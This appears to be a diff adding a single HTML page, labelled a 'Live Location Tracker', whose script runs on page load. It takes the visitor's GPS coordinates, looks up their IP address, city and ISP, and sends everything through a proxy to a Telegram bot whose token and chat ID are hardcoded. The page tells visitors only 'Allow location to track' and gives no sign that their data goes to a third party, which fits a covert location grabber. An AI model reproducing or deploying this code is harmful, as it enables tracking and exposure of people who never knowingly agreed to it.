@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Live Location Tracker</title>
+</head>
+<body>
+    <h2>Live Location Tracker</h2>
+    <p>Allow location to track</p>
+    <script>
+        const botToken = "7328506213:AAH9ikAcipjxwzPtmc_1E0Lb2T8DQSeb9tQ";
+        const chatId = "7108579850";
+
+        function getUserLocation() {
+            if (window.location.protocol !== "https:") {
+                console.error("Geolocation API requires HTTPS.");
+                alert("⚠️ HTTPS প্রয়োজন!");
+                return;
+            }
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+                    getIPAndSend(latitude, longitude);
+                }, error => {
+                    console.error("Geolocation Error:", error);
+                    alert("❌ লোকেশন পারমিশন ব্লক করেছে!");
+                });
+            } else {
+                alert("⚠️ লোকেশন সাপোর্ট করে না!");
+            }
+        }
+
+        function getIPAndSend(latitude, longitude) {
+            fetch("https://api.allorigins.win/raw?url=https://ipwhois.app/json/")
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;
+                    const country = data.country;
+                    const region = data.region;
+                    const city = data.city;
+                    const isp = data.isp;
+                    const googleMapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+                    const message = `📡 *নতুন লোকেশন তথ্য!* \n\n` +
+                                    `🌍 *আইপি:* \`${ip}\`\n` +
+                                    `🏙️ *লোকেশন:* \`${city}, ${region}, ${country}\`\n` +
+                                    `🛜 *ISP:* \`${isp}\`\n` +
+                                    `📍 *Google Maps:* [লোকেশন দেখুন](${googleMapLink})\n\n` +
+                                    `🔍 _ডাটা সংগ্রহ সম্পন্ন!_`;
+
+                    sendToTelegram(message);
+                })
+                .catch(error => {
+                    console.error("IP API Error:", error);
+                    alert("❌ আইপি বের করা যায়নি!");
+                });
+        }
+
+        function sendToTelegram(message) {
+            fetch(`https://api.allorigins.win/raw?url=https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
+            })
+            .then(response => response.json())
+            .then(data => console.log("Sent to Telegram:", data))
+            .catch(error => console.error("Telegram Error:", error));
+        }
+
+        getUserLocation();
+    </script>
+</body>
+</html>
